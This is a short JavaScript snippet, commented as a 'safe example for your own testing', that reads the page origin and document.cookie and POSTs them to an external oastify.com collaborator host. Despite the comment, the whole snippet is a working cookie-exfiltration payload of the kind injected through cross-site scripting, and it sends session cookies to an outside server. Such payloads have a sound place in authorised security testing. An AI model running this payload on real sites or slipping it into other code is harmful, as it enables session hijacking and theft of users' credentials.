// safe example for your own testing
const info = {
  origin: window.location.origin,
  cookie: document.cookie
};

fetch("https://t3xd8evnpec2yy7fz0p13pgc43auyqmf.oastify.com", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(info)
});
